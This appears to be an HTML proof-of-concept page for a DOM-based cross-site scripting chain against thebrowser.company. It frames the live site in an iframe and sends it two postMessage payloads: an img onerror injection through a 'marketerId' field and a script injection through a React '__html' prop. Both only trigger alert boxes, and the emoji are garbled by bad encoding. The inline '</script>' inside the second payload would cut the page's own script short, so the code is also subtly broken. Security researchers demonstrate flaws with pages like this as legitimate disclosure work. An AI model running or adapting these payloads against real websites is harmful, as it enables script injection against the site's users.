<!DOCTYPE html>
<html>
<head>
  <meta charset="utf-8">
  <title>ðŸ”¥ DOM XSS Final Chain â€“ thebrowser.company</title>
</head>
<body>
  <h2>ðŸš€ DOM XSS PoC â€“ marketerId + __html Chain</h2>
  <iframe id="target" src="https://thebrowser.company/" width="100%" height="600" style="border: 2px solid lime;"></iframe>

  <script>
    const iframe = document.getElementById("target");

    iframe.onload = () => {
      console.log("âœ… iframe loaded");

      // Payload 1: marketerId sink
      const marketerPayload = {
        message: "OB_SHOULD_SHOW_PICKER",
        content: {
          marketerId: [
            `<img src=x onerror=alert('ðŸ”¥ XSS via marketerId')>`
          ]
        }
      };

      // Payload 2: React dangerouslySetInnerHTML via __html
      const reactPropsPayload = {
        props: {
          __html: `<script>alert('ðŸ”¥ XSS via props.__html')</script>`
        }
      };

      // Send both
      iframe.contentWindow.postMessage(marketerPayload, "*");
      console.log("ðŸ“¨ marketerId XSS payload sent");

      setTimeout(() => {
        iframe.contentWindow.postMessage(reactPropsPayload, "*");
        console.log("ðŸ“¨ React props.__html XSS payload sent");
      }, 1500);
    };
  </script>
</body>
</html>
